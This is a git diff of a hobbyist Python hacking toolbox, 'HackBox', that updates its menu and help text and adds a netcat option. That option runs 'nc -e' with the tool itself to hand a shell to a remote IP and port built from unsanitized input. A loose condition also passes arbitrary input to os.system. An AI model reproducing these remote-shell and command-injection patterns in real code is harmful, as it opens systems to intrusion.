@@ -3,13 +3,8 @@
 #2/7/2022
 
 #changes---------------------------------------------------------
-#edited refresh to clear screen on linux
-#Added Tux splash (linux penguin)
 
-#TO add:
-# Defense mode, has clam av, rkhunter, fail2ban and lots of logging
-
-# NEed to add a map for visuals showing hackbox, then its respective modes, ( lieka  network map)
+#NOTE! TABS ARE 8 SPACES!!
 #---------------------------------------------------------------
 
 #imports
@@ -35,7 +30,7 @@ import json
 
 #VARS:
 #build
-BUILD = ["HackBoxLinux: Version 1.1; 2/7/2022; ryanq47"]
+BUILD = ["HackBoxLinux: Version 1.1; 4/30/2022; ryanq47"]
 QUESTION = "Hackbox: Anything else I can do?"
 WEB = ['.com', ".edu", "org", ".gov"]
 NETWORK = ['ping', 'ipconfig']
@@ -68,103 +63,102 @@ print(r"""
 print("HackBox: Hey there, choose an option to start!") 
 #print("--(type help for help)--")
 print("""
-OPTIONS 
-x)Attack Mode
-y)Defense Mode
-z)Recon Mode
-s)Scriptrunner
-h)Help
+OPTIONS \n
+x) Attack Mode
+y) Defense Mode
+z) Recon Mode
+s) Scriptrunner
+h) Help
+
+nc) Netcat Quick Connect
 
 
-If connecting through netcat, type any command below to run on local system:          """)
+If connecting through netcat, type any command below to run on the remote system:          """)
 
 
 
 statement = input("").lower()
 while True:
 #Intro
-    if statement == ("hi"):
-	    print ("Hackbox: Hello"); print("Hackbox: Anything else I can do?")
+	if statement == ("hi"):
+		print ("Hackbox: Hello"); print("Hackbox: Anything else I can do?")
 
-    elif statement == ("h") or statement == "help":
-        print("-----------------------------------------------------------------")
-        print(" --- General Config ---")
-        #print("'new'                           : Opens a Blank Empty shell in new window")
-        print("'refresh'                       : Reloads Hackbox") 
-        print("'Search', 'Google', or 'Find'   : Find Relevant info in less clicks - works just like a search bar")
-        print("'Summary'                       : Gives wikipedia summary, sometimes crashes so proceed at your own risk")
-        print("'SITENAME'.com - ex; reddit.com : Type this in wherever, and it'll open said site,")
-        print("                                : make sure to include .com, or .edu, etc!")
-        print("-----------------------------------------------------------------")
-        print(" --- Custom Tools/Modules --- ")
-        # move to recon mode - but put script runner in here, and maybe offensive, and defensive with scripts for each respective style
-        print("NETREPORT    : A 'quick' net report of IP addresses, and connected ports to give an overview of your system's connections!")
-        print("SCRIPTRUNNER    : A built in easy script execution shell, just pop your script in the scripts folder!")       
-        print(" --- External Tools/Modules --- ")
-        print("IPCAM        : A free database of publicly accessible cameras all over the world")
-        print("USERCHECK    : See if a username is being used anywhere!")
-        print("SOCIALSEARCH : Open a direct FB, Insta, and Linkedin Page with just a (valid) username!")
-        #print("KEYLOGGER    : A Keylogger that records to a file, or sends to your email - use at your own discretion")
-        print("-----------------------------------------------------------------")
-        # get argparse working and able to do stuff like hackbox.py -d etc
-        print(" Modes          Command to Enter mode") 
-        print("Defensive Mode (defense, -d) : Hackbox in full defensive mode, great for Blue team ")
-        print("Attack Mode    (attack, -a): Hackbox in full offensive mode, Great for Red team ")
-        print("Recon Mode     (recon, -r): Hackbox in Recon, or spy mode - Great for gathering info ")
-        print("-----------------------------------------------------------------")
-        #print(" --- Arguments ---")
-        #print("-----------------------------------------------------------------")
-        print("Note:")
-        print("-  Case does not matter - upper and lower work the same")
-        print("-  Any standard bash commands should work within Hackbox, just type it in - though you may need sudo")
-        print(".................................................................")
-        print("HackBox: Anything I can do for you?")
+	elif statement == ("h") or statement == "help":
+		print("""
+HackBox is a toolbox for offensive, and defensive security. It has 3 seperate modes, Attack, Defense, and Recon
 
+Attack Mode: Used for attacking a target, including bruteforce attacks, and a few exploits (check out AutoTack, an automated Attack Tool)
+
+Defense Mode: A mode meant to keep you safe, still a work in progress
+
+Recon Mode: A mode used to gather info on a target, or offer an inside glance at the world. 
+
+Scriptrunner: This module is a dedicated script runner, with scripts that are important, but don't contain enough to warrant an
+entire module for them in their current state. 
+
+Commands: 
+To enter/navigate, type in the letter corresponding to the option (ex 'a' for attack mode) and hit enter.
+
+There are a few console commands too:
+refresh - Reloads HackBox, handy for developing to view changes without a program restart.
+exit - Will exit HackBox back into a shell
+build - Will show current HackBox Build info
+
+Note: HackBox does not need to be run as root, but should be if you want to use all the modules. I am working on a stealth mode
+that does not need root for anything, but that is still awhile out
+
+Disclaimer: HackBox can cause a lot of havoc... so please don't do anything illegal, or stupid. Just becuase you can, dosen't mean you should. You've been warned.
+
+Alright time to get cracking, enter a command:				""")
 
 # -- passthrough commands
 #Connection Shiz
-
+	elif statement == 'nc':
+		print('Enter machine IP')
+		forwardIP = input()
+		print('Enter port')
+		forwardPORT = input()
+		os.system('nc -e ./HackBox.py ' + forwardIP + ' ' + forwardPORT)
 
 #QOL-----------------------------------------------------------------------------------
     #Terminal
-    elif statement == ('exit'):
-        exit()
+	elif statement == ('exit'):
+		exit()
     #Refresh/reload
-    elif statement == 'refresh':
-        os.system('clear')
-        exec(open('HackBox.py').read()) 
+	elif statement == 'refresh':
+		os.system('clear')
+		exec(open('HackBox.py').read()) 
     #BuildInfo
-    elif statement == 'build':
-        print (BUILD)
-        print (QUESTION)
+	elif statement == 'build':
+		print (BUILD)
+		print (QUESTION)
 
         
 
 # -- Modes ------------------------------------------------------------------
-    elif statement == 'x':
-        exec(open('Modules/attack/Attack.py').read())
+	elif statement == 'x':
+		exec(open('Modules/attack/Attack.py').read())
 
-    elif statement == 'y':
-        exec(open('Modules/defense/Defense.py').read()) 
+	elif statement == 'y':
+		exec(open('Modules/defense/Defense.py').read()) 
 
-    elif statement == 'z':
-        exec(open('Modules/recon/Recon.py').read()) 
-
-    elif statement == 's':
-        exec(open('Modules/scriptrunner/scriptrunner.py').read()) 
+	elif statement == 'z':
+		exec(open('Modules/recon/Recon.py').read()) 
+	elif statement == 's':
+		exec(open('Modules/scriptrunner/scriptrunner.py').read()) 
 
 #------------------------------------------------------------------------------
 
     #This is a loop that allows for any value in CMD to be checked, and run MUST GO LAST
-    elif any((c in NETWORK) for c in NETWORK):
+	elif any((c in NETWORK) for c in NETWORK):
         #print('---------------------------------------------------')
-        os.system(statement)
-        print('----')
+		os.system(statement)
+		print('----')
         #print("Anything else I can do for you?")
 #------------------------------------------------------------------------------
-    else:
-        print('invalid command - type new for standard shell')
-    statement = input("").lower()
+	else:
+		print('invalid command - type new for standard shell')
+	statement = input("").lower()
 
 
 
